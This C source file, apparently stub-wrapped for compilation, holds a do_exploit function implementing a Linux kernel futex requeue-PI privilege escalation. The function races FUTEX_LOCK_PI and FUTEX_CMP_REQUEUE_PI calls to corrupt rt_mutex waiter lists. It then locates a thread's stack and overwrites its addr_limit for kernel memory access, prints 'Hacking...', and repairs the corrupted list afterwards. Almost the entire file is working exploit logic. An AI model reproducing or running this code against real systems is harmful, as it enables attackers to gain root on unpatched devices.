#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  waiter11 ;
struct thread_info {int /*<<< orphan*/  addr_limit; } ;
struct TYPE_5__ {void* prev; } ;
struct TYPE_4__ {void* next; } ;
struct TYPE_6__ {TYPE_2__ node_list; TYPE_1__ prio_list; } ;
struct rt_mutex_waiter {struct rt_mutex* lock; TYPE_3__ list_entry; } ;
struct rt_mutex {int dummy; } ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  pid_t ;

/* Variables and functions */
 int /*<<< orphan*/  FUTEX_CMP_REQUEUE_PI ; 
 int /*<<< orphan*/  FUTEX_LOCK_PI ; 
 int /*<<< orphan*/  NODE_LIST_TO_WAITER (void*) ; 
 struct rt_mutex_waiter* PRIO_LIST_TO_WAITER (void*) ; 
 int /*<<< orphan*/  SIGNAL_HACK_KERNEL ; 
 int /*<<< orphan*/  __NR_futex ; 
 int /*<<< orphan*/  clientfd ; 
 int /*<<< orphan*/  close (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  create_thread_do_futex_lock_pi_with_priority (int) ; 
 scalar_t__ did_socket_tid_read ; 
 scalar_t__ do_socket_tid_read ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fix_rt_mutex_waiter_list (struct rt_mutex*) ; 
 struct thread_info* hack_thread_stack ; 
 int /*<<< orphan*/  hacked ; 
 int /*<<< orphan*/  hacked_lock ; 
 int /*<<< orphan*/  listenfd ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  pthread_cancel_immediately (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  pthread_cond_wait (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pthread_kill (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  pthread_mutex_lock (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pthread_mutex_unlock (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pwaiter11 ; 
 int read_pipe (int /*<<< orphan*/ ,struct rt_mutex_waiter*,int) ; 
 int /*<<< orphan*/  setup_waiter_params (struct rt_mutex_waiter*) ; 
 scalar_t__ swag ; 
 scalar_t__ swag2 ; 
 scalar_t__ sync_with_child_getchar (int /*<<< orphan*/ ,scalar_t__*,scalar_t__*) ; 
 int syscall (int /*<<< orphan*/ ,scalar_t__*,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,scalar_t__*,scalar_t__) ; 
 int /*<<< orphan*/  thread_client_to_setup_rt_waiter ; 
 int /*<<< orphan*/  usleep (int) ; 
 int /*<<< orphan*/  waiter_thread_tid ; 

__attribute__((used)) static bool do_exploit(void *waiter_plist)
{
	void *magicval, *magicval2;
	struct rt_mutex_waiter *rt_waiters;
	pid_t pid;
	pid_t pid6, pid7, pid12, pid11;
	
	rt_waiters = PRIO_LIST_TO_WAITER(waiter_plist);
	
	syscall(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	
	while (syscall(__NR_futex, &swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag) != 1) {
		usleep(10);
	}
	
	pthread_t th6 =  create_thread_do_futex_lock_pi_with_priority(6);
	pthread_t th7 =  create_thread_do_futex_lock_pi_with_priority(7);
	
	swag2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;
	
	syscall(__NR_futex, &swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag2);
	
	if (sync_with_child_getchar(waiter_thread_tid, &do_socket_tid_read, &did_socket_tid_read) < 0) {
	return false;
	}
	
	setup_waiter_params(rt_waiters);
	magicval = rt_waiters[0].list_entry.prio_list.next;
	printf("Checking whether exploitable..");
	pthread_t th11 =  create_thread_do_futex_lock_pi_with_priority(11);
	
	if (rt_waiters[0].list_entry.prio_list.next == magicval) {
		printf("failed\n");
		return false;
	}
	printf("OK\nSeaching good magic...\n");
	magicval = rt_waiters[0].list_entry.prio_list.next;
	
	pthread_cancel_immediately(th11);
	
	pthread_t th11_1, th11_2;
	while(1) {
		setup_waiter_params(rt_waiters);
		th11_1 = create_thread_do_futex_lock_pi_with_priority(11);
		magicval = rt_waiters[0].list_entry.prio_list.next;
		hack_thread_stack = (struct thread_info *)((unsigned long)magicval & 0xffffffffffffe000);
		rt_waiters[1].list_entry.node_list.prev = (void *)&hack_thread_stack->addr_limit;
		
		th11_2 = create_thread_do_futex_lock_pi_with_priority(11);
		magicval2 = rt_waiters[1].list_entry.node_list.prev;
		
		printf("magic1=%p magic2=%p\n", magicval, magicval2);
		if(magicval < magicval2) {
			printf("Good magic found\nHacking...\n");
			break;
		} else {
			pthread_cancel_immediately(th11_1);
			pthread_cancel_immediately(th11_2);
		}		
	}
	pwaiter11 = NODE_LIST_TO_WAITER(magicval2);
	pthread_mutex_lock(&hacked_lock);
	pthread_kill(th11_1, SIGNAL_HACK_KERNEL);
	pthread_cond_wait(&hacked, &hacked_lock);
	pthread_mutex_unlock(&hacked_lock);
	close(listenfd);
	
	struct rt_mutex_waiter waiter11;
	struct rt_mutex *pmutex;
	int len = read_pipe(pwaiter11, &waiter11, sizeof(waiter11));
	if(len != sizeof(waiter11)) {
		pmutex = NULL;
	} else {
		pmutex = waiter11.lock;
	}
	fix_rt_mutex_waiter_list(pmutex);
	
	pthread_cancel_immediately(th11_1);
	pthread_cancel_immediately(th11_2);
	
	pthread_cancel_immediately(th7);
	pthread_cancel_immediately(th6);
	close(clientfd);
	pthread_cancel_immediately(thread_client_to_setup_rt_waiter);
	
	exit(0);
}